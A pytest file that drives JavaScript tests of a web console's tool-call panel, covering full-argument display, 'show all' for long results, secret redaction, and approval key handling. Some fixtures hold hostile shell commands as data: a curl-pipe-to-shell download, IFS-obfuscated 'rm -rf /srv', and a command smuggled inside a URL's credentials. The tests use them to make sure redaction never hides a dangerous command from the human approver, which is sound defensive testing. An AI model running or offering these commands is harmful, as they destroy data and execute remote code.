"""The web cards' complete view of a tool call and of a long result.

"full call" opens the arguments exactly as the model wrote them (the live
events' ``arguments``, the same text ``/history`` serves), and a result too
long for its box is capped there with its own "show all" control, so checking
an argument never unfolds a large result and no box hides text without a way
to open it.  These run the real shared builders, the real interactive pane and
the real coordinator pane under node.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from tests._js_harness_helpers import (
    BROWSER_FOCUS,
    FAKE_DOM,
    FULL_SELECTORS,
    PANE_DOM,
    QUEUED_FRAMES,
    node_skip,
    run_node_source,
)
from tests._js_harness_helpers import extract_braced as _extract_braced

pytestmark = node_skip

_ROOT = Path(__file__).resolve().parents[1]
_SHARED = _ROOT / "turnstone/shared_static"
_COORDINATOR = _ROOT / "turnstone/console/static/coordinator/coordinator.js"

_TEXT = r"""
const text = el => el.textContent + el.children.map(text).join('');
const describe = el => !el ? 'nothing' : el.tagName + '.' + el.className;
"""

# A browser's focus and frames: selectors as a browser matches them, animation
# frames that run when flushed (after the code that asked for them), and focus
# that leaves with a removed node.  Focus-order bugs hide behind FAKE_DOM's
# immediate frames.
_BROWSER = FULL_SELECTORS + QUEUED_FRAMES + BROWSER_FOCUS


def _shared(name: str) -> str:
    return json.dumps((_SHARED / name).as_uri())


def _run(body: str, *, browser: bool = False) -> None:
    source = FAKE_DOM + PANE_DOM + (_BROWSER if browser else "") + _TEXT + body
    proc = run_node_source(source)
    assert proc.returncode == 0, f"harness failed:\n{proc.stderr}\n{proc.stdout}"


def _builders(scenario: str, *, browser: bool = False) -> None:
    _run(
        f"const conv = await import({_shared('conversation.js')});\n"
        "const row = (name, args) => {\n"
        "  const el = conv.buildConvRow({func_name: name, call_id: 'c-' + name});\n"
        "  html.appendChild(el);\n"
        "  conv.attachConvFullCall(el, args);\n"
        "  return el;\n"
        "};\n"
        "const open = el => {\n"
        "  el.querySelector('.conv-row-full-toggle').click();\n"
        "  return el.querySelector('.conv-row-full');\n"
        "};\n"
        "const args = panel => panel.querySelectorAll('.conv-full-arg').map(arg => [\n"
        "  (arg.querySelector('.conv-full-arg-name') || {textContent: null}).textContent,\n"
        "  arg.querySelector('.conv-full-arg-value').textContent,\n"
        "]);\n" + scenario,
        browser=browser,
    )


def test_full_call_shows_every_argument_as_written() -> None:
    _builders(
        r"""
const query = 'is:open label:bug ' + 'repo:example/turnstone '.repeat(20);
const call = JSON.stringify({query, body: 'line one\nline two', page: {size: 50}});
const el = row('mcp__docs__search', call);
const toggle = el.querySelector('.conv-row-full-toggle');
assert(toggle.parentNode.classList.contains('conv-row-call'), 'the control sits on the call line');
assert(toggle.getAttribute('aria-expanded') === 'false', 'starts closed');
assert(!el.querySelector('.conv-row-full'), 'a call never opened holds no panel');
assert(toggle.textContent === 'full call', 'labelled, its caret drawn by CSS');
assert(toggle.getAttribute('aria-label') === 'Full call: mcp__docs__search', 'named for the tool');
const panel = open(el);
assert(toggle.getAttribute('aria-controls') === panel.id, 'the control names its panel once made');
const caption = panel.querySelector('.conv-full-args-caption');
assert(caption.textContent === 'arguments · as written', 'the panel says what it shows');
assert(panel.getAttribute('role') === 'group' && panel.getAttribute('aria-labelledby') === caption.id,
  'a group named by its caption');
assert(!panel.hidden && toggle.getAttribute('aria-expanded') === 'true', 'opens');
assert(el.dataset.fullCall === 'open', 'the row says it is open');
const shown = args(panel);
assert(shown.length === 3, 'one entry per argument: ' + JSON.stringify(shown));
assert(shown[0][0] === 'query' && shown[0][1] === query, 'a long value is whole');
assert(shown[1][1] === 'line one\nline two', 'a string keeps its own line breaks');
assert(shown[2][1] === JSON.stringify({size: 50}, null, 2), 'other values print as JSON');
toggle.click();
assert(panel.hidden && panel.children.length === 0, 'closing empties the panel');
assert(el.dataset.fullCall === undefined, 'and the row says so');
conv.attachConvFullCall(el, '{}');
assert(el.querySelectorAll('.conv-row-full-toggle').length === 1, 'attaching twice adds nothing');
"""
    )


def test_full_call_keeps_numbers_and_shows_unparsed_text_as_written() -> None:
    _builders(
        r"""
const ids = row('send', '{"channel": 123456789012345678901, "ratio": 1.0, "nested": [1.50]}');
const shown = args(open(ids));
assert(shown[0][1] === '123456789012345678901', 'a large integer keeps its digits: ' + shown[0][1]);
assert(shown[1][1] === '1.0', 'a float keeps its form: ' + shown[1][1]);
assert(shown[2][1].includes('1.50'), 'nested numbers too: ' + shown[2][1]);

const broken = row('bash', '{"command": "ls -la');
const raw = args(open(broken));
assert(raw.length === 1 && raw[0][0] === null, 'unparsed text has no names');
assert(raw[0][1] === '{"command": "ls -la', 'and shows as written');

const list = args(open(row('odd', '[1, 2]')));
assert(list.length === 1 && list[0][1] === JSON.stringify([1, 2], null, 2), 'other JSON prints');

for (const empty of ['', '{}', ' { } ']) {
  assert(!row('none', empty).querySelector('.conv-row-full-toggle'),
    'nothing to open for ' + JSON.stringify(empty));
}
// Model-written text: a long run of whitespace costs no more than its length,
// before arguments as before none.
const started = Date.now();
assert(!row('blank', '\n'.repeat(160000) + '{}').querySelector('.conv-row-full-toggle'),
  'whitespace around {} is still no arguments');
assert(row('padded', '\n'.repeat(160000) + '{"command": "ls"}').querySelector('.conv-row-full-toggle'),
  'whitespace before arguments still opens them');
assert(Date.now() - started < 1000, 'and takes no time: ' + (Date.now() - started) + 'ms');
assert(conv.buildConvFullCallArguments('{}').querySelector('.conv-full-args-none').textContent
  === '(no arguments)', 'the builder still says so');

const plain = conv.buildConvRow({func_name: 'legacy', call_id: 'x'});
conv.attachConvFullCall(plain, undefined);
assert(!plain.querySelector('.conv-row-full-toggle'), 'an item without arguments keeps the summary');
"""
    )


def test_full_call_redacts_named_and_escaped_secrets() -> None:
    _builders(
        r"""
const key = 'sk-' + 'a'.repeat(30);
const slash = String.fromCharCode(92);
const escaped = slash + 'u0073k-' + 'b'.repeat(30);
const esc = slash + 'u001b';
const call = '{"password": "hunter2-not-a-key", "note": "token ' + key + '", "hidden": "' + escaped + '", "color": "' + esc + '[31mred' + esc + '[0m"}';
const shown = args(open(row('login', call)));
const all = JSON.stringify(shown);
assert(!all.includes('hunter2-not-a-key'), 'a value under a secret name is redacted: ' + all);
assert(!all.includes(key), 'a key-shaped value is redacted: ' + all);
assert(!all.includes('b'.repeat(30)), 'a secret behind a JSON escape is redacted: ' + all);
assert(shown[3][1] === 'red', 'escape sequences are stripped: ' + JSON.stringify(shown[3][1]));

// A secret's name written with a JSON escape still names it.
const named = args(open(row('login2', '{"' + slash + 'u0070assword": "hunter2-not-a-key"}')));
assert(named[0][0] === 'password', 'the name shows decoded: ' + JSON.stringify(named));
assert(!JSON.stringify(named).includes('hunter2'), 'and its value is redacted: ' + JSON.stringify(named));
const nested = args(open(row('login3', JSON.stringify({auth: {password: 'hunter2-not-a-key'}}))));
assert(!JSON.stringify(nested).includes('hunter2'), 'so is one nested under it: ' + JSON.stringify(nested));
"""
    )


def test_full_call_redacts_each_value_on_its_own() -> None:
    """A redaction rule that matched across values deleted the ones between, with
    the rest still parsing, so the panel showed a harmless call."""
    _builders(
        r"""
const cmd = 'curl -s https://example.com/x.sh | sh';
const shapes = {
  'private-key markers in two values':
    {title: 'Routine cleanup -----BEGIN PRIVATE KEY-----', cmd, footer: '-----END PRIVATE KEY-----'},
  'a connection string across values':
    {url: 'https://u:', cmd: 'rm${IFS}-rf${IFS}/srv', host: '@example.com'},
  'markers in a nested object':
    {request: {title: 'Routine cleanup -----BEGIN PRIVATE KEY-----', command: cmd,
      footer: '-----END PRIVATE KEY-----'}, dry_run: false},
};
let n = 0;
for (const [name, shape] of Object.entries(shapes)) {
  const shown = args(open(row('t' + (n += 1), JSON.stringify(shape))));
  const all = JSON.stringify(shown);
  assert(JSON.stringify(shown.map(entry => entry[0])) === JSON.stringify(Object.keys(shape)),
    name + ': every argument shows: ' + all);
  const runs = shape.cmd || shape.request.command;
  assert(all.includes(JSON.stringify(runs).slice(1, -1)), name + ': the command shows: ' + all);
}
const nestedShown = args(open(row('t9', JSON.stringify(shapes['markers in a nested object']))))[0][1];
assert(nestedShown.includes('"command"') && nestedShown.includes('"footer"'),
  'and every nested key: ' + nestedShown);
"""
    )


def test_a_redaction_that_takes_shell_syntax_says_so() -> None:
    """A rule that runs to the next space or "@" can take "; rm …" with the secret:
    the value then reads as one harmless command while the rest runs."""
    _builders(
        r"""
const hiding = 'curl -s https://u:x;rm${IFS}-rf${IFS}/srv;#@example.com/health';
const panel = open(row('bash', JSON.stringify({command: hiding})));
const note = panel.querySelector('.conv-redaction-note');
assert(note && note.textContent === 'part of this value is hidden by redaction',
  'the value says part of it is hidden: ' + (note && note.textContent));
const plain = open(row('bash2', JSON.stringify({command: 'curl -s https://u:x@example.com/health'})));
assert(!plain.querySelector('.conv-redaction-note'), 'a redaction that took no shell syntax says nothing');

const holder = document.createElement('div');
holder.appendChild(conv.buildConvCmd({func_name: 'bash', header: hiding}));
const said = holder.querySelector('.conv-redaction-note');
assert(said && said.textContent === 'part of this command is hidden by redaction',
  'the command line says it too: ' + (said && said.textContent));
const clean = document.createElement('div');
clean.appendChild(conv.buildConvCmd({func_name: 'bash', header: 'ls -la; echo done'}));
assert(!clean.querySelector('.conv-redaction-note'), 'shell syntax nothing redacted stays quiet');
"""
    )


def test_open_full_calls_survive_a_rebuild() -> None:
    _builders(
        r"""
const block = document.createElement('div');
html.appendChild(block);
const content = Array.from({length: 40}, (_, i) => 'line ' + i).join('\n');
const build = () => {
  const first = conv.buildConvRow({func_name: 'write_file', call_id: 'a'});
  conv.attachConvFullCall(first, JSON.stringify({path: 'a.py', content}));
  const second = conv.buildConvRow({func_name: 'bash', call_id: 'b'});
  conv.attachConvFullCall(second, '{"command": "false"}');
  block.replaceChildren(first, second);
  return [first, second];
};
let [first, second] = build();
first.querySelector('.conv-row-full-toggle').click();
const valueControl = first.querySelector('.conv-row-full').querySelector('.conv-result-expand');
valueControl.click();
valueControl.focus();
let kept = conv.captureConvFullCalls(block);
[first, second] = build();
conv.restoreConvFullCalls(block, kept);
assert(first.dataset.fullCall === 'open', 'the open call reopens');
assert(second.dataset.fullCall === undefined, 'a closed one stays closed');
const again = first.querySelector('.conv-row-full').querySelector('.conv-result-expand');
assert(again.dataset.expanded === 'true', 'a value shown in full stays shown');
assert(document.activeElement === again, "focus returns to the value's control");
second.querySelector('.conv-row-full-toggle').focus();
kept = conv.captureConvFullCalls(block);
[first, second] = build();
conv.restoreConvFullCalls(block, kept);
assert(document.activeElement === second.querySelector('.conv-row-full-toggle'), 'or to a toggle');
"""
    )


def test_show_all_is_offered_only_when_the_text_runs_past_its_box() -> None:
    _builders(
        r"""
const box = () => { const el = document.createElement('div'); html.appendChild(el); return el; };
const lines = n => Array.from({length: n}, (_, i) => 'line ' + i).join('\n');
const short = box();
assert(conv.buildConvResultExpand(short, {text: 'a\nb', boxLines: 10}) === null, 'a short result has no control');
assert(short.dataset.expanded === undefined, 'and no cap: it shows whole');
assert(conv.buildConvResultExpand(box(), {text: lines(13), boxLines: 13}) === null,
  'as many lines as the box holds fit');
assert(conv.buildConvResultExpand(box(), {text: lines(13) + '\n', boxLines: 13}) === null,
  'a final line break starts no line');
assert(conv.buildConvResultExpand(box(), {text: lines(14), boxLines: 13}), 'one more line does not fit');
assert(conv.buildConvResultExpand(box(), {text: 'y'.repeat(1200), boxLines: 13}) === null,
  'a line the box holds in a few lines fits');
const wrapped = box();
const byChars = conv.buildConvResultExpand(wrapped, {text: 'y'.repeat(1400), boxLines: 13});
assert(byChars && text(byChars).includes('show all · 1,400 chars'),
  'a long line counts as several: ' + (byChars && text(byChars)));
assert(wrapped.dataset.expanded === 'false', 'its box is capped');
byChars.click();
assert(wrapped.dataset.expanded === 'true' && text(byChars).includes('collapse'), 'show all lifts the cap');
byChars.click();
assert(wrapped.dataset.expanded === 'false', 'collapse puts it back');

const folded = box();
const control = conv.buildConvResultExpand(folded, {text: lines(3000), boxLines: 10, fold: true});
assert(text(control).includes('show all · 3,000 lines'), 'it counts the lines: ' + text(control));
assert(folded.classList.contains('collapsed'), 'a folding box starts folded');
assert(control.getAttribute('aria-controls') === folded.id, 'the control names its box');
assert(control.dataset.expanded === 'false' && !control.hasAttribute('aria-expanded'),
  'not shown in full yet, said by the label alone');
folded.click();
assert(folded.dataset.expanded === 'true' && !folded.classList.contains('collapsed'),
  'a click on the fold shows all');
assert(text(control).includes('collapse'), 'then the control collapses');
control.click();
assert(folded.dataset.expanded === 'false' && folded.classList.contains('collapsed'), 'and folds again');
folded.click();
control.click();
folded.click();
assert(folded.dataset.expanded === 'true', 'the fold opens again on a click');

const media = box();
assert(conv.buildConvResultExpand(media, {text: '{\n  "a": 1\n}', boxLines: 0, fold: true}),
  'with no lines allowed, any text folds');
"""
    )


def test_show_all_keeps_its_place_and_a_text_selection() -> None:
    """Collapsing a long box above the viewport keeps its control where it was on
    screen, and a click that ends a text selection in a fold leaves it folded."""
    _builders(
        r"""
const scroller = document.createElement('div');
html.appendChild(scroller);
scroller.scrollTop = 500;
globalThis.getComputedStyle = el => ({overflowY: el === scroller ? 'auto' : 'visible'});
const box = document.createElement('div');
scroller.appendChild(box);
const control = conv.buildConvResultExpand(box, {text: 'r\n'.repeat(40), boxLines: 13});
scroller.appendChild(control);
control.getBoundingClientRect = () => ({top: box.dataset.expanded === 'true' ? 900 : 300});
control.click();
control.click();
assert(scroller.scrollTop === -100, 'the pane moves by what the control moved: ' + scroller.scrollTop);

const folded = document.createElement('div');
html.appendChild(folded);
conv.buildConvResultExpand(folded, {text: 'f\n'.repeat(40), boxLines: 10, fold: true});
window.getSelection = () => 'selected words';
folded.click();
assert(folded.classList.contains('collapsed'), 'ending a selection leaves the fold');
window.getSelection = () => '';
folded.click();
assert(!folded.classList.contains('collapsed'), 'a plain click opens it');
""",
        browser=True,
    )


def test_coordinator_result_past_the_display_cut_shows_every_character() -> None:
    _builders(
        r"""
const full = '{' + '"k": "v",'.repeat(9000) + '"secret": "sk-' + 'c'.repeat(30) + '"}';
const block = conv.buildConvResult(full, {isError: false});
const body = block.children.at(-1);
assert(body.textContent.includes('truncated for display'), 'the box shows the cut');
const control = conv.convResultExpandControl(block);
assert(control, 'a cut result offers show all');
control.click();
assert(body.textContent.length >= full.length - 40, 'show all renders every character');
assert(!body.textContent.includes('truncated for display'), 'without the cut notice');
assert(!body.textContent.includes('c'.repeat(30)), 'still redacted');
assert(block.dataset.expanded === 'true', 'and lifts the height cap');
control.click();
assert(body.textContent.includes('truncated for display'), 'collapse restores the cut');
const short = conv.buildConvResult('ok', {});
assert(conv.convResultExpandControl(short) === null && short.dataset.expanded === undefined,
  'a short result has no control and no cap');
"""
    )


def test_a_key_the_display_cut_runs_through_never_shows() -> None:
    _builders(
        r"""
const key = '-----BEGIN PRIVATE KEY-----\nMIIEvQ' + 'A'.repeat(1600) + '\n-----END PRIVATE KEY-----';
const block = conv.buildConvResult('x'.repeat(64 * 1024 - 400) + key + '\ntail', {isError: false});
const head = block.children.at(-1).textContent;
assert(head.includes('truncated for display'), 'the result is cut');
assert(!head.includes('MIIEvQ') && !head.includes('BEGIN PRIVATE KEY'),
  'no part of a key the cut ran through shows');
assert(head.includes('[REDACTED:private_key]'), 'it is redacted whole');
"""
    )


def test_open_details_make_an_automatic_fold_skip_the_batch() -> None:
    _builders(
        r"""
const batch = conv.buildConvBatchShell({});
html.appendChild(batch);
const el = conv.buildConvRow({func_name: 'bash', call_id: 'z'});
conv.attachConvFullCall(el, '{"command": "true"}');
batch.appendChild(el);
el.querySelector('.conv-row-full-toggle').click();
assert(conv.setConvBatchExpanded(batch, false) === false, 'an automatic fold skips the batch');
assert(batch.dataset.compactFolded === undefined, 'the call stays visible');
el.querySelector('.conv-row-full-toggle').click();
const result = document.createElement('div');
result.dataset.expanded = 'true';
batch.appendChild(result);
assert(conv.setConvBatchExpanded(batch, false) === false, 'so does a result shown in full');
assert(conv.setConvBatchExpanded(batch, false, {manual: true}) === true, 'a manual fold still folds');
"""
    )


_PANE = r"""
InteractivePane.prototype._createDOM = function() {
  this.el = document.createElement('div');
  this.messagesEl = document.createElement('div');
  this.el.appendChild(this.messagesEl);
  html.appendChild(this.el);
  this.inputEl = document.createElement('textarea');
  this.sendBtn = document.createElement('button');
};
const pane = new InteractivePane('ws-full', {base: ''});
pane.isNearBottom = () => false;
pane.scrollToBottom = pane.removeEmptyState = pane.removeThinkingIndicator = pane.setBusy = () => {};
const root = pane.messagesEl;
const receive = event => pane.handleEvent(event);
const rowFor = id => root.querySelector('.conv-row[data-call-id="' + id + '"]');
"""


def _pane(scenario: str, *, browser: bool = False) -> None:
    _run(
        f"const {{InteractivePane}} = await import({_shared('interactive.js')});\n"
        + _PANE
        + scenario,
        browser=browser,
    )


def test_live_rows_open_the_full_call_and_keep_it_through_the_upgrade() -> None:
    _pane(
        r"""
const raw = JSON.stringify({url: 'https://example.com/' + 'p/'.repeat(80), question: 'what?'});
const item = {call_id: 'w1', func_name: 'web_fetch', header: 'web_fetch: https://example.com/p',
  preview: '', needs_approval: false, arguments: raw};
receive({type: 'tool_pending', items: [item]});
rowFor('w1').querySelector('.conv-row-full-toggle').click();
assert(rowFor('w1').dataset.fullCall === 'open', 'the pending call opens');
receive({type: 'tool_info', items: [{...item, auto_approved: true}]});
const upgraded = rowFor('w1');
assert(upgraded.dataset.fullCall === 'open', 'the upgraded card keeps it open');
const value = upgraded.querySelector('.conv-full-arg-value').textContent;
assert(value === 'https://example.com/' + 'p/'.repeat(80), 'with the whole URL: ' + value);
"""
    )


def test_live_long_result_gets_show_all_and_the_warning_lands_after_it() -> None:
    _pane(
        r"""
const item = {call_id: 'r1', func_name: 'read_file', header: 'read_file: /srv/a.py',
  preview: '', needs_approval: false, arguments: '{"path": "/srv/a.py"}'};
receive({type: 'tool_pending', items: [item]});
receive({type: 'tool_info', items: [{...item, auto_approved: true}]});
const lines = Array.from({length: 40}, (_, i) => 'line ' + i).join('\n');
receive({type: 'tool_result', call_id: 'r1', name: 'read_file', output: lines});
const row = rowFor('r1');
const wrap = row.nextElementSibling;
assert(wrap && wrap.classList.contains('conv-result-wrap'), 'a long result travels with its control');
const [box, control] = wrap.children;
assert(box.classList.contains('tool-output') && box.classList.contains('collapsed'), 'folded');
assert(control.classList.contains('conv-result-expand'), 'with show all under it');
row.querySelector('.conv-row-full-toggle').click();
assert(box.classList.contains('collapsed'), 'opening the call leaves the result folded');
control.click();
assert(box.dataset.expanded === 'true', 'show all opens the result');
receive({type: 'output_warning', call_id: 'r1', risk_level: 'medium', flags: ['f']});
assert(wrap.nextElementSibling && wrap.nextElementSibling.classList.contains('conv-warning'),
  'the guard chip lands after the result and its control');

const item2 = {...item, call_id: 'r2'};
receive({type: 'tool_pending', items: [item2]});
receive({type: 'tool_info', items: [{...item2, auto_approved: true}]});
receive({type: 'tool_result', call_id: 'r2', name: 'read_file', output: 'short\nresult'});
const shortBox = rowFor('r2').nextElementSibling;
assert(shortBox.classList.contains('tool-output') && !shortBox.classList.contains('collapsed'),
  'a short result is the box alone, shown whole');
"""
    )


def test_replayed_rows_open_the_stored_call() -> None:
    _pane(
        r"""
const stored = JSON.stringify({command: 'echo ' + 'z'.repeat(300)});
pane.replayHistory([
  {role: 'user', content: 'go'},
  {role: 'assistant', content: '', tool_calls: [{id: 'h1', name: 'bash', arguments: stored}]},
  {role: 'tool', tool_call_id: 'h1', content: Array.from({length: 30}, (_, i) => i).join('\n')},
]);
const row = rowFor('h1');
row.querySelector('.conv-row-full-toggle').click();
const value = row.querySelector('.conv-full-arg-value').textContent;
assert(value === 'echo ' + 'z'.repeat(300), 'the replayed call is whole: ' + value.length);
assert(row.nextElementSibling.classList.contains('conv-result-wrap'), 'its long result has show all');
"""
    )


def test_coordinator_places_show_all_under_its_result_and_replaces_it() -> None:
    source = _COORDINATOR.read_text(encoding="utf-8")
    append_to_row = _extract_braced(
        source, "  function _appendResultToRow(row, output, isError, opts) {"
    )
    assert append_to_row, "coordinator _appendResultToRow not found"
    _run(
        f"const conv = await import({_shared('conversation.js')});\n"
        + r"""
const {buildConvResult, convResultExpandControl, setConvBatchExpanded,
  clearConvVerdictPending, setToolOutputReviewState, buildPreviewChip} = conv;
const _tryMcpErrorBlock = () => null;
const buildToolImages = () => null;
const wsId = 'ws-coord';
const batch = conv.buildConvBatchShell({});
html.appendChild(batch);
const row = conv.buildConvRow({func_name: 'list_workstreams', call_id: 'q1'});
batch.appendChild(row);
"""
        + "const appendResult = "
        + append_to_row.strip()
        + ";\n"
        + r"""
const long = Array.from({length: 200}, (_, i) => 'ws ' + i).join('\n');
const first = appendResult(row, long, false, {});
const control = first.nextElementSibling;
assert(control && control.classList.contains('conv-result-expand'), 'show all sits under the result');
assert(row.children.at(-1) === control, 'at the end of the row');
appendResult(row, long + '\nmore', false, {accepted: true});
assert(row.querySelectorAll('.conv-result-expand').length === 1, 'the old control leaves with its result');
assert(row.querySelectorAll('.conv-row-result').length === 1, 'one result stays');
appendResult(row, 'short', false, {accepted: true});
assert(row.querySelectorAll('.conv-result-expand').length === 0, 'a short result has none');

const pending = conv.buildConvRow({func_name: 'write_file', call_id: 'q2'});
batch.appendChild(pending);
const content = Array.from({length: 100}, (_, i) => 'line ' + i).join('\n');
conv.attachConvFullCall(pending, JSON.stringify({path: 'a.py', content}));
pending.querySelector('.conv-row-full-toggle').click();
const valueControl = pending.querySelector('.conv-row-full').querySelector('.conv-result-expand');
assert(valueControl, 'the open call boxes its long value');
appendResult(pending, long, false, {});
assert(valueControl.isConnected, "a result arriving keeps the open call's value control");
appendResult(pending, long + '\nmore', false, {accepted: true});
assert(valueControl.isConnected, 'so does the accepted result that replaces it');
"""
    )


@pytest.mark.parametrize(
    "needle",
    [
        "attachConvFullCall(row, item.arguments);",
        "attachConvFullCall(entry.row, it.arguments);",
        "arguments: argsRaw,",
        'callLine.querySelector(".conv-row-full-toggle")',
    ],
)
def test_coordinator_rows_carry_the_full_call(needle: str) -> None:
    """First paint, the upgrade that first brings the arguments, and /history
    replay all hand the call's text to the row; an error pill goes before the
    toggle, which keeps the line's right edge."""
    assert needle in _COORDINATOR.read_text(encoding="utf-8")


def _handler(source: str, anchor: str) -> str:
    start = source.index(anchor) + len(anchor)
    body = _extract_braced(source[start:], "{")
    assert body and body.startswith("{"), f"handler after {anchor!r} not found"
    return body


def test_keys_on_a_control_never_decide_the_call_in_the_interactive_pane() -> None:
    """While a call awaits approval, Enter on a focused control runs that control
    (on Deny it denies), and Escape on a full call or "show all" does nothing.
    Enter on Deny used to approve."""
    handler = _handler(
        (_SHARED / "interactive.js").read_text(encoding="utf-8"),
        'this.el.addEventListener("keydown", (e) => ',
    )
    _pane(
        f"const {{convKeyBelongsToControl}} = await import({_shared('conversation.js')});\n"
        + r"""
FakeElement.prototype.value = '';
const decisions = [];
pane.resolveApproval = approved => decisions.push(approved);
const item = {call_id: 'k1', func_name: 'bash', header: 'bash: rm -rf /tmp/x', preview: '',
  needs_approval: true, arguments: '{"command": "rm -rf /tmp/x"}'};
receive({type: 'approve_request', cycle_id: 'cy1', items: [item]});
const summary = document.createElement('summary');
root.appendChild(summary);
const keydown = (function() { return (e) => """
        + handler
        + r"""; }).call(pane);
const press = (target, key) => { target.focus(); keydown({key, target, shiftKey: false, preventDefault() {}}); };
const toggle = root.querySelector('.conv-row-full-toggle');
press(root.querySelector('.conv-btn--deny'), 'Enter');
press(toggle, 'Enter');
press(summary, 'Enter');
assert(decisions.length === 0, 'Enter on a control must not approve: ' + JSON.stringify(decisions));
press(toggle, 'y');
press(rowFor('k1'), 'Enter');
assert(JSON.stringify(decisions) === '[true,true]', 'letters, and Enter elsewhere, still approve');
press(toggle, 'Escape');
toggle.click();
press(toggle, 'Escape');
press(rowFor('k1').querySelector('.conv-row-full'), 'Escape');
assert(decisions.length === 2, 'Escape on a full call, open or closed, decides nothing');
assert(rowFor('k1').dataset.fullCall === 'open', 'and leaves it as it was');
press(rowFor('k1'), 'Escape');
assert(JSON.stringify(decisions) === '[true,true,false]', 'Escape elsewhere denies');
press(root.querySelector('.conv-feedback'), 'Enter');
assert(JSON.stringify(decisions) === '[true,true,false,true]', 'Enter in the feedback field approves');
""",
        browser=True,
    )


def test_keys_on_a_control_never_decide_the_call_in_the_coordinator() -> None:
    handler = _handler(
        _COORDINATOR.read_text(encoding="utf-8"),
        'root.addEventListener("keydown", function (e) ',
    )
    _run(
        f"const {{convKeyBelongsToControl}} = await import({_shared('conversation.js')});\n"
        + r"""
const resolved = [];
const batch = document.createElement('div');
const sbApprovalEl = document.createElement('button');
const _currentPendingBatch = () => batch;
const _resolveBatchAction = (b, approved, always) => resolved.push([approved, always]);
const keydown = function (e) """
        + handler
        + r""";
const press = (target, key, extra = {}) => {
  document.activeElement = target;
  keydown({key, target, preventDefault() {}, ...extra});
};
const deny = document.createElement('button');
const toggle = document.createElement('button');
toggle.className = 'conv-row-full-toggle';
const summary = document.createElement('summary');
const row = document.createElement('div');
batch.append(deny, toggle, summary, row);
press(deny, 'Enter');
press(toggle, 'Enter');
press(summary, 'Enter');
assert(resolved.length === 0, 'Enter on a control must not approve: ' + JSON.stringify(resolved));
press(toggle, 'd');
press(row, 'Enter');
assert(JSON.stringify(resolved) === '[[false,false],[true,false]]', 'D and Enter elsewhere still resolve');
press(toggle, 'Escape');
assert(resolved.length === 2, 'Escape on a full call decides nothing');
press(row, 'Escape');
assert(JSON.stringify(resolved.at(-1)) === '[false,false]', 'Escape elsewhere denies');
""",
        browser=True,
    )


# The real interactive pane, its keydown listener as a browser runs it: Enter
# that no handler prevented clicks a focused button.
_KEYS = r"""
const decisions = [];
pane.resolveApproval = approved => decisions.push(approved);
const key = name => {
  const target = document.activeElement;
  let prevented = false;
  const event = {key: name, target, shiftKey: false, preventDefault() { prevented = true; }};
  for (const entry of pane.el._listeners.get('keydown') || []) entry.fn(event);
  if (name === 'Enter' && !prevented && target && target.tagName === 'BUTTON') target.click();
};
const content = Array.from({length: 40}, (_, i) => 'line ' + i).join('\n');
const writeCall = id => ({call_id: id, func_name: 'write_file', header: 'write_file: a.py',
  preview: '', needs_approval: true, arguments: JSON.stringify({path: 'a.py', content})});
const bash = {call_id: 'k1', func_name: 'bash', header: 'bash: rm -rf /srv', preview: '',
  needs_approval: true, arguments: '{"command": "rm -rf /srv"}'};
"""

_FOCUS_SCENARIOS = {
    # The early-paint shell is rebuilt when approval is asked for; whoever was
    # reading the call keeps it, focus included, and the feedback field does
    # not take focus from them a frame later.
    "upgrade-with-the-toggle-focused": r"""
receive({type: 'tool_pending', items: [writeCall('u1')]});
flushFrames();
let toggle = rowFor('u1').querySelector('.conv-row-full-toggle');
toggle.focus();
toggle.click();
receive({type: 'approve_request', cycle_id: 'cy1', items: [writeCall('u1')]});
flushFrames();
toggle = rowFor('u1').querySelector('.conv-row-full-toggle');
assert(document.activeElement === toggle, 'focus stays on the call: ' + describe(document.activeElement));
key('Escape');
assert(decisions.length === 0 && rowFor('u1').dataset.fullCall === 'open', 'Escape there decides nothing');
key('Enter');
assert(decisions.length === 0 && rowFor('u1').dataset.fullCall === undefined, 'Enter closes the call');
""",
    "upgrade-with-a-value-focused": r"""
receive({type: 'tool_pending', items: [writeCall('u1')]});
flushFrames();
rowFor('u1').querySelector('.conv-row-full-toggle').click();
let value = rowFor('u1').querySelector('.conv-row-full').querySelector('.conv-result-expand');
value.click();
value.focus();
receive({type: 'approve_request', cycle_id: 'cy1', items: [writeCall('u1')]});
flushFrames();
value = rowFor('u1').querySelector('.conv-row-full').querySelector('.conv-result-expand');
assert(value.dataset.expanded === 'true', 'the value stays shown in full');
assert(document.activeElement === value, 'and keeps focus: ' + describe(document.activeElement));
key('Escape');
key('Enter');
assert(decisions.length === 0, 'neither key decides the call: ' + JSON.stringify(decisions));
assert(value.dataset.expanded === 'false', 'Enter collapses the value');
""",
    # Focus on anything else in the shell is lost when it is emptied; the
    # feedback field does not pick it up.
    "upgrade-with-something-else-focused": r"""
receive({type: 'tool_pending', items: [writeCall('u1')]});
flushFrames();
const other = document.createElement('button');
rowFor('u1').closest('.conv-batch').appendChild(other);
other.focus();
receive({type: 'approve_request', cycle_id: 'cy1', items: [writeCall('u1')]});
flushFrames();
assert(document.activeElement === document.body,
  'focus the rebuild dropped stays dropped: ' + describe(document.activeElement));
""",
    # A new card arriving while someone reads an earlier, finished call.
    "a-new-card-while-reading": r"""
const done = {...writeCall('k0'), needs_approval: false};
receive({type: 'tool_pending', items: [done]});
receive({type: 'tool_info', items: [{...done, auto_approved: true}]});
receive({type: 'tool_result', call_id: 'k0', name: 'write_file', output: 'ok'});
flushFrames();
const toggle = rowFor('k0').querySelector('.conv-row-full-toggle');
toggle.focus();
toggle.click();
receive({type: 'approve_request', cycle_id: 'cy1', items: [bash]});
flushFrames();
assert(document.activeElement === toggle, 'focus stays with the reader: ' + describe(document.activeElement));
key('Escape');
key('Enter');
assert(decisions.length === 0, 'neither key decides the new call: ' + JSON.stringify(decisions));
""",
    # With nothing in hand the new card takes focus, as it always has.
    "a-new-card-with-nothing-focused": r"""
receive({type: 'approve_request', cycle_id: 'cy1', items: [bash]});
flushFrames();
assert(document.activeElement === root.querySelector('.conv-feedback'),
  'the feedback field takes focus: ' + describe(document.activeElement));
""",
    # A pane scrolled back to read is not pulled down to a new card.
    "a-new-card-while-scrolled-back": r"""
pane.isNearBottom = () => false;
receive({type: 'approve_request', cycle_id: 'cy1', items: [bash]});
flushFrames();
assert(document.activeElement === null, 'nothing takes focus: ' + describe(document.activeElement));
""",
}


@pytest.mark.parametrize("scenario", sorted(_FOCUS_SCENARIOS))
def test_an_approval_card_leaves_focus_with_the_reader(scenario: str) -> None:
    _pane(
        "pane.isNearBottom = () => true;\n" + _KEYS + _FOCUS_SCENARIOS[scenario],
        browser=True,
    )


